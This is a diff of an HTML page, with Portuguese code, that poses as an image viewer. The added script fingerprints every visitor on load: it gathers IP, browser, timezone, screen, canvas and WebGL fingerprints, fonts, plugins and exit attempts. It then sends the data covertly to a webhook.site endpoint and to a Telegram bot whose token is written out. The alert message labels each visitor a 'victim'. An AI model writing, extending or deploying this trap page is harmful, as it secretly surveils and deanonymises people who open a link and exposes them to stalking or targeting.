@@ -1,90 +1,121 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Imagem</title>
+  <title>Verificando...</title>
   <style>
-    html, body {
+    body {
       margin: 0;
-      padding: 0;
-      height: 100%;
       background: #000;
     }
     img {
-      width: 100%;
-      height: auto;
-      display: block;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
     }
   </style>
 </head>
 <body>
-  <img src="https://i.imgur.com/S8kkWtc.jpeg" alt="Imagem">
+  <img src="https://i.imgur.com/S8kkWtc.jpeg" alt="carregando">
+
   <script>
     const inicio = Date.now();
-    let scrollMax = 0;
     let tentouSair = false;
 
-    document.addEventListener("scroll", () => {
-      scrollMax = Math.max(scrollMax, window.scrollY);
-    });
-
-    document.addEventListener("mouseout", function (e) {
+    document.addEventListener("mouseout", e => {
       if (e.clientY < 0) tentouSair = true;
     });
 
-    async function rastrearEEnviar() {
-      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "N/A");
+    async function fingerprint() {
+      const ip = await fetch("https://api.ipify.org?format=json")
+        .then(r => r.json()).then(d => d.ip).catch(() => "Desconhecido");
+
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillText("fingerprint", 2, 2);
+      const canvasFP = canvas.toDataURL();
+
+      const gl = document.createElement("canvas").getContext("webgl");
+      const glRenderer = gl ? gl.getParameter(gl.RENDERER) : "Desconhecido";
 
       const dados = {
         ip: ip,
-        dispositivo: navigator.userAgent,
-        fingerprint: navigator.userAgent + navigator.language + screen.width + screen.height,
-        horario: new Date().toLocaleString(),
-        plataforma: navigator.platform,
         idioma: navigator.language,
+        sistema: navigator.platform,
+        navegador: navigator.userAgent,
+        fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
         resolucao: screen.width + "x" + screen.height,
-        comportamento: {
-          tempoNaPaginaSeg: Math.floor((Date.now() - inicio) / 1000),
-          rolouPaginaAte: scrollMax,
-          tentouSair: tentouSair
-        },
-        imagem: "https://imgur.com/a/UodXBtb",
-        sentimento: "curioso e vulnerável"
+        touch: 'ontouchstart' in window ? "Sim" : "Não",
+        tempoNaPagina: Math.floor((Date.now() - inicio) / 1000) + "s",
+        tentouSair: tentouSair ? "Sim" : "Não",
+        canvasFingerprint: canvasFP.slice(100, 140), // resumo
+        webglRenderer: glRenderer,
+        fontes: getFontList(),
+        plugins: Array.from(navigator.plugins).map(p => p.name)
       };
 
+      // Enviar para Webhook.site
       fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(dados)
       });
 
+      // Enviar para Telegram
       fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: 94845670,
           text: `
-⚠️ VISUALIZAÇÃO ARMADILHA ⚠️
+🔍 *Nova vítima identificada* 🔍
 
 IP: ${dados.ip}
-Device: ${dados.dispositivo}
-Plataforma: ${dados.plataforma}
+Sistema: ${dados.sistema}
+Navegador: ${dados.navegador}
 Idioma: ${dados.idioma}
+Fuso horário: ${dados.fusoHorario}
 Resolução: ${dados.resolucao}
-Fingerprint: ${dados.fingerprint}
-Horário: ${dados.horario}
-Tempo na página: ${dados.comportamento.tempoNaPaginaSeg}s
-Scroll máximo: ${dados.comportamento.rolouPaginaAte}px
-Tentou sair: ${dados.comportamento.tentouSair ? "SIM" : "não"}
-Imagem exibida: ${dados.imagem}
-Sentimento: ${dados.sentimento}
-`
+Touchscreen: ${dados.touch}
+Tempo na página: ${dados.tempoNaPagina}
+Tentou sair: ${dados.tentouSair}
+Canvas Fingerprint: ${dados.canvasFingerprint}
+WebGL Renderer: ${dados.webglRenderer}
+Fontes: ${dados.fontes.join(", ").slice(0, 300)}...
+Plugins: ${dados.plugins.join(", ").slice(0, 300)}...
+          `.trim(),
+          parse_mode: "Markdown"
         })
       });
     }
 
-    rastrearEEnviar();
+    function getFontList() {
+      const fonts = [
+        'Arial', 'Verdana', 'Times New Roman', 'Courier', 'Tahoma',
+        'Georgia', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Calibri'
+      ];
+      const available = [];
+      const canvas = document.createElement("canvas");
+      const context = canvas.getContext("2d");
+      const testText = "abcdefghi0123456789";
+      canvas.width = 1000;
+      canvas.height = 100;
+      context.textBaseline = "top";
+      context.font = "72px monospace";
+      const defaultWidth = context.measureText(testText).width;
+
+      fonts.forEach(font => {
+        context.font = `72px '${font}', monospace`;
+        if (context.measureText(testText).width !== defaultWidth) {
+          available.push(font);
+        }
+      });
+      return available;
+    }
+
+    fingerprint();
   </script>
 </body>
 </html>
